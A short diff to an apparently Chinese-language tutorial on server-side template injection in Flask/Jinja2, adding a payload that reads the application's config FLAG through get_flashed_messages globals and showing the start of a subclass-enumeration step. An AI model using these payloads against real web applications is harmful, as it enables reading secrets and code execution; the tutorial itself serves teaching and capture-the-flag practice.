@@ -1,3 +1,7 @@
+```
+{{get_flashed_messages.__globals__['current_app'].config['FLAG']}}
+```
+
 ## 一文了解SSTI和所有常见payload 以flask模板为例
 
 **前言**
@@ -229,6 +233,7 @@ SSTI主要就是活用各种魔术方法
 复制
 
 - 寻找可用引用
+
 
 ```javascript
 >>> ''.__class__.__mro__[2].__subclasses__()
